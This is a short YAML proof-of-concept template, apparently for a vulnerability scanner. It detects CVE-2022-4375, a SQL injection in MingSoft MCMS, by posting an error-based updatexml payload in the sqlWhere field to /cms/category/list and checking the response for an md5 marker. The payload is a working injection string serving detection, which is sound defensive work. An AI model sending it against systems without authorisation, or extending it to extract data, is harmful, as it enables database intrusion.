name: yaml-poc-mingsoft-mcms-sql_injection-CVE-2022-4375
binding: c1ccc9ec-8e59-4034-af45-e16762e53e31
detail:
    author: jiapeng.han
    links:
        - https://gitee.com/mingSoft/MCMS/issues/I61TG5
        - https://vuldb.com/?id.215196
    vulnerability:
        id: a1ade1b4-d92a-4939-86d1-34f875ca56d8
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(40000, 44800)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cms/category/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                sqlWhere=[{"action":"","field":"1 AND updatexml(1,concat(0x7e,md5({{r1}})),1)","el":"eq","model":"contentTitle","name":"文章标题","type":"input","value":"a"}]
        expression: response.status == 500 && response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
expression: r0()
